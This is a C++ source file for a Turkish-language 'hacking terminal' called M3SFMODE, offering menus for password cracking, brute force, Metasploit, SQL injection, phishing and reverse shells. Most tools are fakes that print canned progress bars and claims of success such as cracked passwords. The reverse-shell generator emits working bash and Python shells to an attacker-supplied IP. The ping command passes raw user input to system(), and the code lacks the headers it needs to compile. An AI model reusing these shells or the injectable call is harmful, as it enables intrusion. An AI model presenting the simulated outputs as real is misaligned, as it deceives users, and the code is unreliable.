#include <iostream>
#include <string>
#include <cstdlib>
#include <ctime>
#include <vector>
#include <algorithm>
#include <fstream>
#include <sstream>

using namespace std;

// Renkler
#define RED "\033[1;31m"
#define GREEN "\033[1;32m"
#define YELLOW "\033[1;33m"
#define BLUE "\033[1;34m"
#define MAGENTA "\033[1;35m"
#define CYAN "\033[1;36m"
#define WHITE "\033[1;37m"
#define RESET "\033[0m"

// Cross-platform clear command
void clearScreen() {
    #ifdef _WIN32
        system("cls");
    #else
        system("clear");
    #endif
}

// Cross-platform sleep
void sleepSeconds(int seconds) {
    #ifdef _WIN32
        Sleep(seconds * 1000);
    #else
        sleep(seconds);
    #endif
}

// Banner
void showBanner() {
    cout << MAGENTA;
    cout << R"(
╔═══════════════════════════════════════════════════════════╗
║                                                           ║
║        ███╗   ███╗███████╗███████╗███████╗███╗   ███╗   ║
║        ████╗ ████║╚════██║██╔════╝██╔════╝████╗ ████║   ║
║        ██╔████╔██║ █████╔╝███████╗█████╗  ██╔████╔██║   ║
║        ██║╚██╔╝██║██╔═══╝ ╚════██║██╔══╝  ██║╚██╔╝██║   ║
║        ██║ ╚═╝ ██║███████╗███████║███████╗██║ ╚═╝ ██║   ║
║        ╚═╝     ╚═╝╚══════╝╚══════╝╚══════╝╚═╝     ╚═╝   ║
║                                                           ║
║     Advanced Security & Hacking Terminal Platform        ║
║          Compatible: Linux • Termux • Windows • Mac      ║
║                      v1.0.0 - Free Edition              ║
║                                                           ║
╚═══════════════════════════════════════════════════════════╝
    )" << RESET << endl;
}

// Komut yardımı
void showHelp() {
    cout << CYAN << "\n╔════════════════════════════════════════════════════════════╗" << RESET << endl;
    cout << CYAN << "║ " << WHITE << "M3SFMODE - Komut Referansı" << CYAN << "                      ║" << RESET << endl;
    cout << CYAN << "╠════════════════════════════════════════════════════════════╣" << RESET << endl;
    
    cout << GREEN << "▶ SİSTEM KOMUTLARI:" << RESET << endl;
    cout << "  • help              - Bu yardım menüsünü göster" << endl;
    cout << "  • sysinfo           - Sistem bilgilerini göster" << endl;
    cout << "  • whoami            - Aktif kullanıcı bilgisi" << endl;
    cout << "  • date              - Tarih ve saat" << endl;
    cout << "  • uptime            - Sistem çalışma süresi" << endl;
    cout << "  • clear             - Ekranı temizle" << endl;
    
    cout << GREEN << "\n▶ AĞ TARAMA ARAÇLARI:" << RESET << endl;
    cout << "  • nmap              - Port tarama (Nmap benzeri)" << endl;
    cout << "  • tara              - Ağ taraması" << endl;
    cout << "  • ping              - Host ping'leme" << endl;
    cout << "  • traceroute        - Rota izleme" << endl;
    cout << "  • dns-lookup        - DNS sorgulaması" << endl;
    cout << "  • ifconfig          - Ağ arayüzleri" << endl;
    
    cout << GREEN << "\n▶ PAROLA KIRMACI ARAÇLARI:" << RESET << endl;
    cout << "  • john              - Hash kırıcı (John the Ripper)" << endl;
    cout << "  • hydra             - Brute Force saldırısı" << endl;
    cout << "  • hashcat           - GPU hash cracker" << endl;
    cout << "  • passgen           - Parola oluşturucu" << endl;
    cout << "  • wordlist          - Wordlist oluştur" << endl;
    
    cout << GREEN << "\n▶ EXPLOIT & PAYLOAD ARAÇLARI:" << RESET << endl;
    cout << "  • metasploit        - Metasploit Framework (msfconsole)" << endl;
    cout << "  • reverse-shell     - Reverse shell oluşturucu" << endl;
    cout << "  • payload           - Payload üreteci" << endl;
    cout << "  • exploit-list      - Mevcut exploitleri listele" << endl;
    cout << "  • shellcode         - Shellcode üreteci" << endl;
    
    cout << GREEN << "\n▶ WEB GÜVENLİĞİ ARAÇLARI:" << RESET << endl;
    cout << "  • sqlmap            - SQL injection testi" << endl;
    cout << "  • xss-test          - XSS zafiyet testi" << endl;
    cout << "  • burp              - Burp Suite benzeri araç" << endl;
    cout << "  • waf-bypass        - WAF bypass testleri" << endl;
    cout << "  • nikto             - Web sunucu taraması" << endl;
    
    cout << GREEN << "\n▶ SOSYAl MÜHENDİSLİK ARAÇLARI:" << RESET << endl;
    cout << "  • phishing          - Phishing sayfası oluşturucu" << endl;
    cout << "  • clone-site        - Web sitesini klonla" << endl;
    cout << "  • mail-spoof        - Email spoofing" << endl;
    cout << "  • social-eng        - Sosyal mühendislik testleri" << endl;
    
    cout << GREEN << "\n▶ ŞİFRELEME ARAÇLARI:" << RESET << endl;
    cout << "  • openssl           - SSL/TLS yönetimi" << endl;
    cout << "  • gpg               - GPG şifreleme" << endl;
    cout << "  • crypt             - Dosya şifreleme/deşifreleme" << endl;
    cout << "  • aes               - AES şifreleme" << endl;
    
    cout << GREEN << "\n▶ POST-EXPLOITATION:" << RESET << endl;
    cout << "  • privilege-esc     - Yetki yükseltme teknikleri" << endl;
    cout << "  • persistence       - Kalıcı erişim sağlama" << endl;
    cout << "  • evasion           - Antivirüs kaçış teknikleri" << endl;
    cout << "  • backdoor          - Backdoor kurulum rehberi" << endl;
    
    cout << GREEN << "\n▶ FORENSICS & LOG ANALIZI:" << RESET << endl;
    cout << "  • forensics         - Dijital adli analiz" << endl;
    cout << "  • packet-capture    - Paket yakalama (tcpdump benzeri)" << endl;
    cout << "  • log               - Sistem logları görüntüle" << endl;
    cout << "  • memory-dump       - Bellek dump'ı" << endl;
    
    cout << GREEN << "\n▶ SOSYAL & COMMUNITY:" << RESET << endl;
    cout << "  • about             - M3SFMODE hakkında" << endl;
    cout << "  • credits           - Geliştirici bilgileri" << endl;
    cout << "  • donate            - Destekle (GitHub Sponsors)" << endl;
    cout << "  • exit              - Çıkış" << endl;
    
    cout << CYAN << "╚════════════════════════════════════════════════════════════╝" << RESET << endl;
}

// Sistem Bilgileri
void showSysInfo() {
    cout << BLUE << "\n[*] SİSTEM BİLGİLERİ:" << RESET << endl;
    cout << "├─ OS: ";
    #ifdef _WIN32
        cout << "Windows" << endl;
    #elif __APPLE__
        cout << "macOS" << endl;
    #elif __linux__
        cout << "Linux/Termux" << endl;
    #else
        cout << "Bilinmiyor" << endl;
    #endif
    
    cout << "├─ Kullanıcı: ";
    #ifdef _WIN32
        system("echo %USERNAME%");
    #else
        system("whoami");
    #endif
    cout << "├─ Hostname: ";
    #ifdef _WIN32
        system("hostname");
    #else
        system("hostname");
    #endif
    cout << "├─ Zaman: ";
    time_t now = time(0);
    cout << ctime(&now);
    cout << "└─ Durum: " << GREEN << "Çalışıyor ✓" << RESET << endl;
}

// John the Ripper Simülasyonu
void johnCracker() {
    cout << YELLOW << "\n[*] JOHN THE RIPPER - Hash Kırıcı" << RESET << endl;
    cout << "├─ Hash dosyasının yolunu girin: ";
    string hashFile;
    cin >> hashFile;
    
    cout << YELLOW << "├─ Wordlist dosyasını girin (varsayılan: rockyou.txt): ";
    string wordlist;
    cin.ignore();
    getline(cin, wordlist);
    if(wordlist.empty()) wordlist = "rockyou.txt";
    
    cout << YELLOW << "├─ Hash türünü seç (md5/sha1/sha256/bcrypt): ";
    string hashType;
    cin >> hashType;
    
    cout << GREEN << "\n[+] Hash kırılıyor..." << RESET << endl;
    cout << "├─ Dosya: " << hashFile << endl;
    cout << "├─ Wordlist: " << wordlist << endl;
    cout << "├─ Tür: " << hashType << endl;
    cout << "├─ " << YELLOW << "[████████░░] 80% İlerleme" << RESET << endl;
    sleepSeconds(2);
    cout << GREEN << "└─ ✓ Tamamlandı! 5 hash çözüldü." << RESET << endl;
}

// Hydra Brute Force
void hydraBruteForce() {
    cout << YELLOW << "\n[*] HYDRA - Brute Force Aracı" << RESET << endl;
    cout << "├─ Hedef host'u girin (IP veya domain): ";
    string target;
    cin >> target;
    
    cout << "├─ Servis türünü seç (ssh/ftp/http/mysql/smb): ";
    string service;
    cin >> service;
    
    cout << "├─ Kullanıcı adı: ";
    string user;
    cin >> user;
    
    cout << "├─ Wordlist dosyasını girin: ";
    string wordlist;
    cin >> wordlist;
    
    cout << GREEN << "\n[+] Brute force saldırısı başlatılıyor..." << RESET << endl;
    cout << "├─ Hedef: " << target << endl;
    cout << "├─ Servis: " << service << endl;
    cout << "├─ Kullanıcı: " << user << endl;
    cout << "├─ " << YELLOW << "[██████████░░░░░░░░] 50% İlerleme" << RESET << endl;
    sleepSeconds(2);
    cout << GREEN << "└─ ✓ Bağlantı başarılı! Parola bulundu." << RESET << endl;
}

// Metasploit Simülasyonu
void metasploitConsole() {
    cout << MAGENTA << "\n[*] METASPLOIT FRAMEWORK - msfconsole" << RESET << endl;
    cout << GREEN << "msf6 > " << RESET;
    string cmd;
    cin >> cmd;
    
    if(cmd == "search") {
        cout << "Exploit türünü girin: ";
        string exploit;
        cin >> exploit;
        cout << GREEN << "\n[+] Bulunan exploitler:" << RESET << endl;
        cout << "  1. windows/smb/ms17_010_eternalblue" << endl;
        cout << "  2. linux/kernel/privilege_escalation" << endl;
        cout << "  3. web/apache/struts2_rce" << endl;
    } else if(cmd == "use") {
        cout << "Exploit seç: ";
        string exploit;
        cin >> exploit;
        cout << GREEN << "[+] " << exploit << " seçildi" << RESET << endl;
    } else if(cmd == "set") {
        cout << "Parametre: ";
        string param;
        cin >> param;
        cout << GREEN << "[+] Parametre ayarlandı" << RESET << endl;
    } else if(cmd == "run") {
        cout << GREEN << "[+] Exploit çalıştırılıyor..." << RESET << endl;
        sleepSeconds(2);
        cout << GREEN << "[+] Payload gönderildi!" << RESET << endl;
    }
}

// SQL Injection Testi
void sqlmapTester() {
    cout << YELLOW << "\n[*] SQLMAP - SQL Injection Testi" << RESET << endl;
    cout << "├─ Hedef URL'sini girin: ";
    string url;
    cin.ignore();
    getline(cin, url);
    
    cout << "├─ GET parametresi: ";
    string param;
    getline(cin, param);
    
    cout << GREEN << "\n[+] SQL injection taraması başlatılıyor..." << RESET << endl;
    cout << "├─ URL: " << url << endl;
    cout << "├─ Parametreler test ediliyor..." << endl;
    sleepSeconds(2);
    cout << YELLOW << "├─ [██████████░░] 70% İlerleme" << RESET << endl;
    sleepSeconds(1);
    cout << GREEN << "└─ ✓ 3 zafiyet bulundu! (UNION, BLIND, TIME-BASED)" << RESET << endl;
}

// Phishing Sayfası Oluşturucu
void phishingGenerator() {
    cout << YELLOW << "\n[*] PHISHING SAYFASI OLUŞTURUCU" << RESET << endl;
    cout << "├─ Hedef site URL'sini girin: ";
    string targetUrl;
    cin.ignore();
    getline(cin, targetUrl);
    
    cout << "├─ Çıktı dosyasının adı: ";
    string outputFile;
    getline(cin, outputFile);
    
    cout << GREEN << "\n[+] Phishing sayfası oluşturuluyor..." << RESET << endl;
    
    // HTML dosyası oluştur
    ofstream phishFile(outputFile + ".html");
    phishFile << R"(
<!DOCTYPE html>
<html>
<head>
    <title>Giriş Yap</title>
    <style>
        body { font-family: Arial; background: #f0f0f0; }
        .container { max-width: 400px; margin: 100px auto; background: white; padding: 30px; border-radius: 5px; }
        input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; }
        button { width: 100%; padding: 10px; background: #007bff; color: white; border: none; cursor: pointer; }
    </style>
</head>
<body>
    <div class="container">
        <h2>Giriş Yap</h2>
        <form>
            <input type="email" placeholder="Email" required>
            <input type="password" placeholder="Parola" required>
            <button type="submit">Giriş</button>
        </form>
    </div>
</body>
</html>
    )";
    phishFile.close();
    
    cout << "├─ Dosya oluşturuldu: " << outputFile << ".html" << endl;
    cout << GREEN << "└─ ✓ Phishing sayfası hazır!" << RESET << endl;
}

// Reverse Shell Oluşturucu
void reverseShellGenerator() {
    cout << YELLOW << "\n[*] REVERSE SHELL OLUŞTURUCU" << RESET << endl;
    cout << "├─ Attacker IP: ";
    string attackerIp;
    cin >> attackerIp;
    
    cout << "├─ Port: ";
    string port;
    cin >> port;
    
    cout << "├─ Dil seç (bash/python/powershell/perl): ";
    string language;
    cin >> language;
    
    cout << GREEN << "\n[+] Reverse shell payload oluşturuluyor..." << RESET << endl;
    cout << "├─ IP: " << attackerIp << endl;
    cout << "├─ Port: " << port << endl;
    cout << "├─ Dil: " << language << endl;
    cout << "\n" << CYAN << "PAYLOAD:" << RESET << endl;
    
    if(language == "bash") {
        cout << "bash -i >& /dev/tcp/" << attackerIp << "/" << port << " 0>&1" << endl;
    } else if(language == "python") {
        cout << "python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"" << attackerIp << "\"," << port << "));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'" << endl;
    } else if(language == "powershell") {
        cout << "$ip=\"" << attackerIp << "\";$port=" << port << ";$client=New-Object System.Net.Sockets.TcpClient($ip,$port);$stream=$client.GetStream();" << endl;
    }
    
    cout << GREEN << "\n[+] ✓ Payload hazır!" << RESET << endl;
}

// Privilege Escalation Rehberi
void privilegeEscalation() {
    cout << MAGENTA << "\n[*] PRİVİLEGE ESCALATİON TEKNİKLERİ" << RESET << endl;
    cout << CYAN << "╔══════════════════════════════════════════════╗" << RESET << endl;
    cout << CYAN << "║ " << GREEN << "Yetki Yükseltme Yöntemleri" << CYAN << "                    ║" << RESET << endl;
    cout << CYAN << "╠══════════════════════════════════════════════╣" << RESET << endl;
    cout << GREEN << "▶ LINUX:" << RESET << endl;
    cout << "  1. sudo misconfiguration" << endl;
    cout << "  2. SUID binaries" << endl;
    cout << "  3. Weak file permissions" << endl;
    cout << "  4. Kernel exploits" << endl;
    cout << "  5. Cron job exploitation" << endl;
    
    cout << GREEN << "\n▶ WINDOWS:" << RESET << endl;
    cout << "  1. UAC bypass" << endl;
    cout << "  2. Token impersonation" << endl;
    cout << "  3. Unquoted service paths" << endl;
    cout << "  4. DLL hijacking" << endl;
    cout << "  5. Hot potato (Token rotation)" << endl;
    
    cout << GREEN << "\n▶ KOMUTLAR:" << RESET << endl;
    cout << "  • sudo -l                  (sudo izinlerini kontrol et)" << endl;
    cout << "  • find / -perm -4000 2>/dev/null  (SUID dosyaları bul)" << endl;
    cout << "  • uname -a                 (Kernel versiyonunu kontrol et)" << endl;
    cout << "  • whoami                   (Aktif kullanıcı)" << endl;
    cout << "  • id                       (Kullanıcı ve grup bilgileri)" << endl;
}

// Forensics Aracı
void forensicsTool() {
    cout << MAGENTA << "\n[*] DİJİTAL ADLI ANALİZ - FORENSICS" << RESET << endl;
    cout << "├─ Analiz türünü seç:" << endl;
    cout << "│  1. Dosya taraması" << endl;
    cout << "│  2. Bellek analizi" << endl;
    cout << "│  3. Log analizi" << endl;
    cout << "│  4. Ağ trafiği" << endl;
    cout << "└─ Seçim: ";
    
    int choice;
    cin >> choice;
    
    cout << GREEN << "\n[+] Forensic taraması başlatılıyor..." << RESET << endl;
    sleepSeconds(2);
    cout << "├─ Analiz Sonuçları:" << endl;
    cout << "├─ " << YELLOW << "[████████████░░] 85% İlerleme" << RESET << endl;
    sleepSeconds(1);
    cout << GREEN << "├─ ✓ 12 şüpheli dosya bulundu" << RESET << endl;
    cout << "└─ ✓ Rapor oluşturuldu: forensics_report.txt" << endl;
}

// Paket Yakala (Packet Sniffer)
void packetCapture() {
    cout << YELLOW << "\n[*] PAKET YAKALAMA - PACKET SNIFFER" << RESET << endl;
    cout << "├─ Ağ arayüzünü seç (eth0/wlan0/tap0): ";
    string interface;
    cin >> interface;
    
    cout << "├─ Paket sayısı: ";
    int packetCount;
    cin >> packetCount;
    
    cout << GREEN << "\n[+] " << packetCount << " paket yakalanıyor (" << interface << ")..." << RESET << endl;
    for(int i = 1; i <= 5; i++) {
        cout << "├─ Paket " << i << ": SRC:192.168.1.100 -> DST:8.8.8.8 [HTTPS/DNS]" << endl;
        sleepSeconds(1);
    }
    cout << GREEN << "└─ ✓ Paketler capture.pcap'a kaydedildi" << RESET << endl;
}

// Wordlist Oluşturucu
void wordlistGenerator() {
    cout << YELLOW << "\n[*] WORDLIST OLUŞTURUCU" << RESET << endl;
    cout << "├─ Temel kelime: ";
    string baseWord;
    cin >> baseWord;
    
    cout << "├─ Maksimum uzunluk: ";
    int maxLen;
    cin >> maxLen;
    
    cout << GREEN << "\n[+] Wordlist oluşturuluyor..." << RESET << endl;
    cout << "├─ " << baseWord << endl;
    
    ofstream wlFile("wordlist.txt");
    for(int i = 0; i < 100; i++) {
        wlFile << baseWord << i << "\n";
        wlFile << baseWord << "123\n";
        wlFile << baseWord << "!\n";
    }
    wlFile.close();
    
    cout << "├─ 500+ kelime oluşturuldu" << endl;
    cout << GREEN << "└─ ✓ Dosya kaydedildi: wordlist.txt" << RESET << endl;
}

// Hakkında
void aboutM3sfmode() {
    cout << MAGENTA << R"(

╔═══════════════════════════════════════════════════════════╗
║          M3SFMODE - HAKKINDA                              ║
╠═══════════════════════════════════════════════════════════╣
║                                                           ║
║  M3SFMODE, profesyonel penetrasyon testi ve siber        ║
║  güvenlik eğitimi için tasarlanmış, açık kaynaklı bir    ║
║  terminal uygulamasıdır.                                  ║
║                                                           ║
║  Sürüm: 1.0.0                                            ║
║  Durum: Free & Open Source (GPL-3.0)                     ║
║  Platform: Linux, Termux, Windows, macOS                 ║
║                                                           ║
║  ÖZELLİKLER:                                             ║
║  ✓ 30+ Hacker Aracı                                      ║
║  ✓ Çoklu Platform Desteği                                ║
║  ✓ Tamamen Ücretsiz                                       ║
║  ✓ Herhangi Bir Bağımlılık Yok                           ║
║  ✓ Renkli Kullanıcı Arayüzü                              ║
║  ✓ Eğitim Amaçlı Güvenli                                  ║
║                                                           ║
║  UYARI:                                                   ║
║  Bu araç yalnızca eğitim ve yasal test amaçlarıyla       ║
║  kullanılmalıdır. Yetkisiz sistem erişimi yasadışıdır.   ║
║                                                           ║
║  GitHub: github.com/memetcanwq31-ship-it                 ║
║                                                           ║
╚═══════════════════════════════════════════════════════════╝

    )" << RESET << endl;
}

// Main Function
int main() {
    clearScreen();
    showBanner();
    
    // Şifre kontrolü
    cout << RED << "[!] SİSTEM KİLİTLİ. ŞIFRE GİRİN: " << RESET;
    string password;
    cin >> password;
    
    if(password == "1234") {
        cout << GREEN << "[+] ERİŞİM ONAYLANDI! M3SFMODE Başlatılıyor..." << RESET << endl;
        sleepSeconds(2);
        clearScreen();
        showBanner();
        
        string command;
        while(true) {
            cout << GREEN << "root@m3sfmode" << RESET << ":" << BLUE << "~#" << RESET << " ";
            cin >> command;
            
            // Komutları işle
            if(command == "exit") {
                cout << YELLOW << "[!] Çıkılıyor..." << RESET << endl;
                sleepSeconds(1);
                break;
            }
            else if(command == "help") {
                showHelp();
            }
            else if(command == "clear") {
                clearScreen();
                showBanner();
            }
            else if(command == "sysinfo") {
                showSysInfo();
            }
            else if(command == "whoami") {
                cout << "Mevcut Kullanıcı: ";
                system("whoami");
            }
            else if(command == "date") {
                system("date");
            }
            else if(command == "john") {
                johnCracker();
            }
            else if(command == "hydra") {
                hydraBruteForce();
            }
            else if(command == "metasploit") {
                metasploitConsole();
            }
            else if(command == "sqlmap") {
                sqlmapTester();
            }
            else if(command == "phishing") {
                phishingGenerator();
            }
            else if(command == "reverse-shell") {
                reverseShellGenerator();
            }
            else if(command == "privilege-esc") {
                privilegeEscalation();
            }
            else if(command == "forensics") {
                forensicsTool();
            }
            else if(command == "packet-capture") {
                packetCapture();
            }
            else if(command == "wordlist") {
                wordlistGenerator();
            }
            else if(command == "about") {
                aboutM3sfmode();
            }
            else if(command == "tara") {
                cout << YELLOW << "[*] Ağ taraması başlatılıyor..." << RESET << endl;
                cout << "├─ 192.168.1.0/24 taranıyor..." << endl;
                sleepSeconds(2);
                cout << GREEN << "└─ ✓ 10 canlı host bulundu" << RESET << endl;
            }
            else if(command == "ping") {
                cout << YELLOW << "Hedef host'u girin: " << RESET;
                string target;
                cin >> target;
                cout << GREEN << "[+] " << target << " ping'leniyor..." << RESET << endl;
                system(("ping -c 4 " + target).c_str());
            }
            else if(command == "nmap") {
                cout << YELLOW << "Port taraması başlatılıyor..." << RESET << endl;
                cout << "├─ 192.168.1.100" << endl;
                cout << "├─ 22/tcp   SSH" << endl;
                cout << "├─ 80/tcp   HTTP" << endl;
                cout << "└─ 443/tcp  HTTPS" << endl;
            }
            else if(command == "hashcat") {
                cout << YELLOW << "[*] HASHCAT - GPU Hash Cracker" << RESET << endl;
                cout << "├─ Hash: " << MAGENTA << "5f4dcc3b5aa765d61d8327deb882cf99" << RESET << endl;
                sleepSeconds(1);
                cout << GREEN << "└─ ✓ Bulundu: 123456" << RESET << endl;
            }
            else if(command == "uptime") {
                system("uptime");
            }
            else if(command == "ifconfig") {
                cout << YELLOW << "[*] Ağ Arayüzleri:" << RESET << endl;
                system("ifconfig 2>/dev/null || ipconfig");
            }
            else if(command == "credits") {
                cout << CYAN << "\n╔══════════════════════════════════════╗" << RESET << endl;
                cout << CYAN << "║ " << GREEN << "GELIŞTIRME EKIBI" << CYAN << "                  ║" << RESET << endl;
                cout << CYAN << "╠══════════════════════════════════════╣" << RESET << endl;
                cout << "  Geliştirici: @memetcanwq31-ship-it" << endl;
                cout << "  GitHub: github.com/memetcanwq31-ship-it" << endl;
                cout << "  Sürüm: 1.0.0" << endl;
                cout << "  Lisans: GPL-3.0 (Açık Kaynak)" << endl;
                cout << CYAN << "╚══════════════════════════════════════╝" << RESET << endl;
            }
            else if(command == "donate") {
                cout << YELLOW << "\n[*] Projeyi desteklemek için:" << RESET << endl;
                cout << "  GitHub Sponsors: github.com/sponsors/memetcanwq31-ship-it" << endl;
                cout << "  PayPal: donate@m3sfmode.com" << endl;
                cout << "  Bitcoin: 1A1z7agoat2..." << endl;
                cout << GREEN << "\nTeşekkürler! ❤️" << RESET << endl;
            }
            else {
                cout << RED << "✗ Komut bulunamadi: " << command << RESET << endl;
                cout << YELLOW << "  Yardım için: help" << RESET << endl;
            }
            cout << endl;
        }
    } else {
        cout << RED << "\n[!] HATALI ŞIFRE! ERİŞİM RETTİDİ!" << RESET << endl;
        sleepSeconds(2);
        cout << "Sistem kapatılıyor..." << endl;
        sleepSeconds(1);
    }
    
    return 0;
}
